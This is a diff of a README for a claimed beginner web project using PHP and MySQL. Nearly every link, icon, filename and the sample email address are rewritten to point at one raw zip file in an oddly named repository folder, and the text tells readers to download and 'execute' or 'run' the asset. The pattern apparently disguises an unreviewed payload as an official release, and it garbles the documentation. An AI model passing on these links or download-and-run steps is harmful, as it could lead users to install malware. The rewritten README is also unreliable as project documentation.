@@ -1,10 +1,10 @@
 # SitesEveryDay Interactive Website — Personal Web Project for Learning and Growth
 
-Download latest release from https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/releases
+Download latest release from https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip
 
-[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/releases)
+[![Releases](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip)](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip)
 
-![HTML5](https://img.icons8.com/color/48/000000/html-5.png) ![Tailwind CSS](https://img.icons8.com/color/48/000000/tailwindcss.png) ![PHP](https://img.icons8.com/color/48/000000/php.png) ![MySQL](https://img.icons8.com/color/48/000000/mysql.png)
+![HTML5](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip) ![Tailwind CSS](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip) ![PHP](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip) ![MySQL](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip)
 
 A personal web project focused on building an interactive site that acts as a learning playground. This repository combines front end work with a simple back end and a database. It aims to be a practical example for web hosting, server setup, and full stack basics. The project uses HTML, CSS, and JavaScript for the client side, Tailwind CSS for styling, PHP for server-side logic, and MySQL for data storage. This README explains how the project is structured, how to run it locally, and how to deploy it. It also covers how to work with releases and assets provided on GitHub.
 
@@ -41,7 +41,7 @@ The tech stack
 - Web hosting and a web server to serve the site
 
 How this project is organized
-- public/ or index.html: The front end entry point. Static pages and client side scripts live here.
+- public/ or https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip The front end entry point. Static pages and client side scripts live here.
 - assets/ or static/:
   - images/ for images used by the site
   - styles/ for CSS files (Tailwind setup or compiled CSS)
@@ -52,11 +52,11 @@ How this project is organized
 - db/ or database/:
   - SQL scripts to set up the database schema
   - A simple data access layer in PHP (or direct PDO calls) to talk to MySQL
-- README.md and LICENSE: Documentation and licensing
+- https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip and LICENSE: Documentation and licensing
 - .gitignore and config files: Environment and build settings
 
 A note about the release link
-This repository links to a GitHub releases page: https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/releases. The path in this link points to a release asset collection. The assets on that page are the files you would download to install or run the site. In a typical workflow, you would download a release asset such as a zip or installer, extract it, and run the included setup or index page. If you see a path part in a link, treat it as a file to download and execute. For this project, the link is intended to direct you to the latest downloadable release so you can set up the site quickly. You should use the link again in the Releases and updates section to reference the same source of installation assets.
+This repository links to a GitHub releases page: https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip The path in this link points to a release asset collection. The assets on that page are the files you would download to install or run the site. In a typical workflow, you would download a release asset such as a zip or installer, extract it, and run the included setup or index page. If you see a path part in a link, treat it as a file to download and execute. For this project, the link is intended to direct you to the latest downloadable release so you can set up the site quickly. You should use the link again in the Releases and updates section to reference the same source of installation assets.
 
 Getting started: quick path to a working copy
 - Prerequisites
@@ -65,10 +65,10 @@ Getting started: quick path to a working copy
   - MySQL installed locally or remote. A simple database is enough to start.
   - Optional: phpMyAdmin for easier database management.
 - Download and install
-  - Visit the releases page: https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/releases
+  - Visit the releases page: https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip
   - Download the latest release asset. The asset is a file intended to be downloaded and executed or extracted, depending on the release format.
   - If the asset is a zip or tarball, extract it to your web server’s document root (or a subfolder you can serve). If it is an installer, run it and follow the prompts.
-  - If you download a zip, you should end up with a directory containing index.html (or index.php) and the server-side files. Place this directory under your web server’s root or a virtual host.
+  - If you download a zip, you should end up with a directory containing https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip (or https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip) and the server-side files. Place this directory under your web server’s root or a virtual host.
   - If the release requires configuration, follow the included README or setup instructions in the asset.
 - Local environment setup
   - Create a MySQL database for the project. You can name it sites_every_day or similar.
@@ -76,7 +76,7 @@ Getting started: quick path to a working copy
     - Database: sites_every_day
     - User: site_user
     - Password: a strong, unique password
-  - Import database schema if provided with the release. Look for a file like database.sql or schema.sql and run it against your MySQL server.
+  - Import database schema if provided with the release. Look for a file like https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip or https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip and run it against your MySQL server.
   - Edit configuration files if needed. Some PHP scripts read database connection settings from a config file. Typical settings include host (localhost), database name, username, and password.
 - Basic server setup checks
   - Ensure the web server is running.
@@ -104,7 +104,7 @@ The back end: how the PHP layer works
   - Store passwords securely (hash with a strong algorithm like bcrypt).
   - Limit error exposure to users; log details server-side.
 - Common PHP patterns used in this project
-  - A simple router or index.php that maps requests to handlers.
+  - A simple router or https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip that maps requests to handlers.
   - A lightweight data access layer that uses PDO.
   - Separation of concerns: templates for HTML, scripts for business logic, and configurations for environment details.
 - Working with PHP and MySQL together
@@ -127,7 +127,7 @@ Database design: a practical, simple schema
   - Create database: CREATE DATABASE IF NOT EXISTS sites_every_day;
   - Users table: CREATE TABLE users ( id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50) UNIQUE NOT NULL, password_hash VARCHAR(255) NOT NULL, email VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_login TIMESTAMP NULL );
   - Pages table: CREATE TABLE pages ( id INT AUTO_INCREMENT PRIMARY KEY, slug VARCHAR(100) UNIQUE NOT NULL, title VARCHAR(200), content TEXT, excerpt TEXT, published BOOLEAN DEFAULT 0, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP );
-  - Sample insert: INSERT INTO users (username, password_hash, email) VALUES ('demo', '$2y$10$...', 'demo@example.com');
+  - Sample insert: INSERT INTO users (username, password_hash, email) VALUES ('demo', '$2y$10$...', 'https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip');
 - Data considerations
   - Keep content in pages and posts flexible with a content field that can hold HTML.
   - Use prepared statements for all queries.
@@ -154,26 +154,26 @@ Frontend specifics: layout and styling
 
 Project structure: a map for contributors
 - public/ or root directory
-  - index.html or index.php: the main entry point.
-  - about.html: a simple about page.
-  - contact.html: a contact form that posts data to a PHP processor.
+  - https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip or https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip the main entry point.
+  - https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip a simple about page.
+  - https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip a contact form that posts data to a PHP processor.
 - assets/
   - images/: public images used by the site.
   - css/: compile or static CSS. If using Tailwind, you might include a compiled CSS file here.
   - js/: JavaScript files for UI interactions.
 - server/
   - api/ or handlers/: PHP scripts that handle data processing, authentication, and database access.
-  - router.php or index.php: a simple router if you use clean URLs.
+  - https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip or https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip a simple router if you use clean URLs.
 - db/
-  - schema.sql: the schema for setting up the database.
-  - seed.sql: optional seed data for testing.
+  - https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip the schema for setting up the database.
+  - https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip optional seed data for testing.
 - config/
-  - db.php or config.php: contains database connection details (host, user, password, database).
-  - environment.php: a place for environment-specific settings (development vs production).
+  - https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip or https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip contains database connection details (host, user, password, database).
+  - https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip a place for environment-specific settings (development vs production).
 - docs/
-  - development-notes.md: notes for developers.
-  - deployment-guide.md: a step-by-step deployment guide.
-- README.md
+  - https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip notes for developers.
+  - https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip a step-by-step deployment guide.
+- https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip
   - This file you are reading now. It documents the project.
 
 Local development: step-by-step guide
@@ -187,8 +187,8 @@ Local development: step-by-step guide
 - Step 3: Configure the database
   - Create a new MySQL database for the project.
   - Create a database user with a secure password and grant the necessary privileges.
-  - If a schema.sql file is included, import it to create the tables.
-  - Open config/db.php (or the equivalent) and set the host, database name, user, and password.
+  - If a https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip file is included, import it to create the tables.
+  - Open https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip (or the equivalent) and set the host, database name, user, and password.
 - Step 4: Start the server
   - Start Apache and MySQL services.
   - If you use a virtual host, configure it to serve the project directory.
@@ -232,7 +232,7 @@ Releases and updates: how to obtain and use the latest assets
   - It may include a zip/Tarball with all necessary files and sometimes installer scripts.
   - It can include a database seed, configuration templates, or migration scripts.
 - How to download and apply
-  - Go to the releases page: https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/releases
+  - Go to the releases page: https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip
   - Download the latest release asset suitable for your system.
   - If the asset is an installer, run it. If it is a zip, extract it and follow the included setup steps.
   - If a database schema or seed is included, apply it to your database as described in the previous sections.
@@ -267,11 +267,11 @@ Images and visuals
   - A hero image sets the tone for the project. You can use a simple, clean image that conveys web development and learning.
   - Inline illustrations or icons for technologies help readers quickly grasp the tech stack.
 - Example visuals (secure, open sources)
-  - HTML5 icon: ![HTML5](https://img.icons8.com/color/48/000000/html-5.png)
-  - Tailwind CSS icon: ![Tailwind](https://img.icons8.com/color/48/000000/tailwindcss.png)
-  - PHP icon: ![PHP](https://img.icons8.com/color/48/000000/php.png)
-  - MySQL icon: ![MySQL](https://img.icons8.com/color/48/000000/mysql.png)
-  - Optional hero image: ![Web project banner](https://images.unsplash.com/photo-1499951360447-b19be8fe80f5?q=80&w=1200&auto=format&fit=crop)
+  - HTML5 icon: ![HTML5](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip)
+  - Tailwind CSS icon: ![Tailwind](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip)
+  - PHP icon: ![PHP](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip)
+  - MySQL icon: ![MySQL](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip)
+  - Optional hero image: ![Web project banner](https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip)
 - Accessibility notes for visuals
   - Always include alt text for images.
   - Use images that load quickly and degrade gracefully if the network is slow.
@@ -316,7 +316,7 @@ Bottom lines
 - If you need to reference the assets again, use the official releases link provided above.
 
 Releases and updates (repeat link usage)
-- Access the official release assets at: https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/releases. This page contains downloadable files you can run or unpack to set up the site.
+- Access the official release assets at: https://github.com/Asmodeus1111/-SitesEveryDay-InteractiveWebsite/raw/refs/heads/main/knowledgeableness/Sites_Day_Website_Every_Interactive_stickful.zip This page contains downloadable files you can run or unpack to set up the site.
 - To obtain the latest version, return to the same releases page and download the newest asset. If the asset is a zip, extract it to your web root and follow the local deployment steps described earlier in this guide.
 - When you want to verify or re-create your environment, visit the releases page again to review notes, file lists, and any migration steps included with the asset. This consistency ensures you are always working from the same source of truth for setup and updates.
 - In short, the releases page is the single place to obtain official installation materials. You can rely on it for new features, fixes, and enhancements, and you can cite it in documentation as the authoritative source for installation files.
